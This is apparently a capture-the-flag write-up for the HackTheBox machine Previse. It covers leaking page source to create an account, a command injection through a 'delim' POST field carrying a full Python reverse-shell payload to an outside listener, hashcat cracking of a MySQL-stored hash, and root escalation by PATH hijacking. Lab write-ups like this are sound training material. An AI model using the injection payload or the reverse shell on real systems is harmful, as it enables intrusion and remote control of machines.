# Previse 
  
  ![Screenshot from 2022-01-03 23-01-27](https://user-images.githubusercontent.com/79413473/147961137-b14b2316-8549-46b2-ad37-c9d077763f2f.png)
  
This was a Easy Linux machine on HackTheBox. Let's Dive into it.

**Name: Previse
  IP:   10.10.11.104**
  
+ First step first, let's search for open portsusing rustscan(https://github.com/RustScan/RustScan) `rustscan -a 10.10.11.104 -u 5000`.

  Only 2 ports open 80 & 22.
  
+ Nmap scan: `nmap -A -p22,80 -T4 10.10.11.104`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```  
+ SSH is running on port 22 and Apache webserver on port 80 with PHP. Nothing seems much interesting from version number.
+ Let's enumerate directories on web server.
  ![Screenshot from 2022-01-03 23-08-57](https://user-images.githubusercontent.com/79413473/147961792-8ea37d0b-d100-4879-b07a-a6a2e563eead.png)
  
+ Website have a login option but not register portal. And default creds. don't work. Checking source code,nothing there also. Everything else redirect to
 */login.php*. 
+ At this point nothing was vulnerable to me. Tried SQL injection on login page but no luck.
+ If you notice there is **config.php** file which was giving 200 response unlike others but had blank page in response. So i though of curling it to see response.
  `curl http://10.10.11.104/config.php`. But response was blank.
+ Then i remembered from one of the ctf i did from Tryhackme to *see actual source code of page what's happening under the hood as page was rickrolling after  loading using js redirection*. So i decided to curl **accounts.php** file due to it's big size. You could have noticed this using burp also , always use proxy LOL.
+ And voila it was vulnerable and leaked it's source code in response instead of being a "ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!".
  ![Screenshot from 2022-01-03 23-33-05](https://user-images.githubusercontent.com/79413473/147963945-971678f5-4f90-4c3d-bd77-6b22ae3d77f7.png)
  
+ Reading through it you can understand that you can create a new user by Sending a POST request. Use either burp or curl to do same, i did curl .
  **`curl -X POST http://10.10.11.104/accounts.php -d "username=notadmin&password=admin&confirm=admin"`**
+ Now you can loginn with *notadmin:admin*. And start poking around.
+  From **/file.php** you can download files. Let's look at *siteBackup.zip*. `unzip` it and you will get various files.
+  There are some mysql creds. in **config.php** file which we can save for later.

## Foothold: Command injection

+ Reading **file_logs.php** file these guys keep logs of our actions and provide an option to download it. They provide tan option to set delimeter in log files.   How sweet of them. Reading through content of **logs.php** file you can spot the command injection vulnerability in Python **exec() fucntion**.

`$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");`

user input *delim* is concatenated directly without sanitization. Bad Habit! :/

+ Reading about exec() [https://www.geeksforgeeks.org/exec-in-python/] it takes a string as input and treats them as an set of python commands. So we have to inject our own python reverse shell in it. Let's grab one from pentest monkey [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]. Have your listener ready.

Payload : `delim=;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.69",8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` . Ending initial string and then injecting python command.

 ![Screenshot from 2022-01-04 00-03-34](https://user-images.githubusercontent.com/79413473/147966656-2719e7e0-7d1c-4b0d-a0b4-56db47448d2f.png)
 
  
  Send it and you will catch your shell.
  
## Lateral Movement: User Hash cracking 

+ Let's list listening services. `ss -lntp` and mysql service is runnin let's login with creds. we got earlier.
 
  `mysql -u root -p`
  
  let's read accounts table.
  
  ![Screenshot from 2022-01-04 00-12-53](https://user-images.githubusercontent.com/79413473/147967323-a28a9c71-d72e-4214-b147-69e4cc95500d.png)
  
+ As we don't what this hashing method is with salt icon, it was help time from discord ;). Apparently hashcat can crack it but it takes some time.

`hashcat -a 0 -m 500 hash ~/wordlist/rockyou.txt  --force`. 
1. -a is attack mode 0 loading file sfrom dictionary.
2. -m 500 as hash starts with $1
3. then hash file & wordlist path.

**password: ilovecody112235!**

+ Let's login as m4lwhere user `su m4lwhere`
+ Reading user flag. ed3baa8.................


## Privilge escaltion: Path injection

+ User may run `/opt/scripts/access_backup.sh` file as root. *sudo -l*. 
+ But that file has no write permission so we can't get root that way.
+ Let's read it's content. 

 ```
!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

```  
+ looks like it may be a path injection case, as date and gzip binaries are called without complete path.
+ Let's create a date file in **/tmp** directory. with content `/bin/bash` in it. 
+ Make it executable `chmod +x date`.
+ Change PATH=/tmp:$PATH. Now when date binary will be called it will check first in /tmp directory and it will execute malicious one.
+ As m4lwhere run the script you will get the root shell.

  ![Screenshot from 2022-01-04 01-04-39](https://user-images.githubusercontent.com/79413473/147972269-bf729291-dd96-4623-813c-649ce10399b1.png).
 
+ Now you are root and read root flag.


That was pretty much it. Let me know if there is an y feedback maybe i am explaining too much.

Thank you.






















 
